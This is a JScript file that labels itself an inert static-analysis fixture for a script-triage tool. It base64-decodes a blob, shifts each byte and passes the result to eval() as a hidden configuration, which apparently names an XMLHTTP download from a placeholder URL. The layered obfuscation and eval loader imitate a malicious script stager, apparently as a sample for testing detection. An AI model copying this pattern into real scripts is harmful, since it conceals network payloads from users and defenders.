// Huntress Script Triage -- inert static-analysis fixture (wsh_jscript_windows)
function decodeBase64(text) {
  var alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
  var clean = text.replace(/[^A-Za-z0-9+\/=]/g, "");
  var output = [];
  for (var p = 0; p < clean.length; p += 4) {
    var a = alphabet.indexOf(clean.charAt(p));
    var b = alphabet.indexOf(clean.charAt(p + 1));
    var c = clean.charAt(p + 2) == "=" ? -1 : alphabet.indexOf(clean.charAt(p + 2));
    var d = clean.charAt(p + 3) == "=" ? -1 : alphabet.indexOf(clean.charAt(p + 3));
    output.push((a << 2) | (b >> 4));
    if (c >= 0) output.push(((b & 15) << 4) | (c >> 2));
    if (d >= 0) output.push(((c & 3) << 6) | d);
  }
  return output;
}
var decode_ccba684d = function decode_ccba684d_body(storedMaterial) {
  var recoveredMaterial = [];
  for (var i = 0; i < storedMaterial.length; i++) { recoveredMaterial.push((storedMaterial[i] - 24 + 256) % 256); }
  return recoveredMaterial;
};
var recover_a551887e = function recover_a551887e_body() {
  if (true) {
    var packedText = "kzqLjH2IizpSczp5e4mNgYp9d4p9hYeMfTpEOo+KgYx9d36BhH06dUQ6eXx5iIx9ijpSOmWBe4qHi4d+jEZwZWRgbGxoOkQ6jnmEjX2LOlKTOnt5hYh5gX+Gd4F8OlI6e3mFiHmBf4ZFSkhKSU9PTk9MSjpEOo2KhDpSOoCMjIiLUkdHSkhKSU9PTk9MSkZ9kHmFiIR9RoGGjnmEgXxHe0p+eVBIUEpGfHmMOkQ6jYt9ind5f32GjDpSOmCNhoyKfYuLZHl6R0pISklPT05PTEo6RDp+gYR9d4h5jIA6UjpbUnR0bYt9iot0dGiNeoSBe3R0YI2GjIp9i4tkeXp0dIuMeX99RUpISklPT05PTEpGfHmMOpVEOouMeX99W4eNhow6UkqV";
    var storedMaterial = decodeBase64(packedText);
    var harmlessValue = ["north", "south"].join(":");
    var recoveredMaterial = decode_ccba684d.call(null, storedMaterial);
    var configurationText = "", bi = 0;
    for (bi = 0; bi < recoveredMaterial.length; bi++) { configurationText += String.fromCharCode(recoveredMaterial[bi]); }
    return configurationText;
  }
};
var inspect_65ba3ef1 = function inspect_65ba3ef1_body() {
  var configuration = eval("(" + recover_a551887e.call(null) + ")");
  var table = { steps: function() { return configuration.steps; }, values: function() { return configuration.values; } };
  return { steps: table.steps.call(null), adapter: configuration.adapter, values: table.values.call(null), stageCount: configuration.stageCount };
};
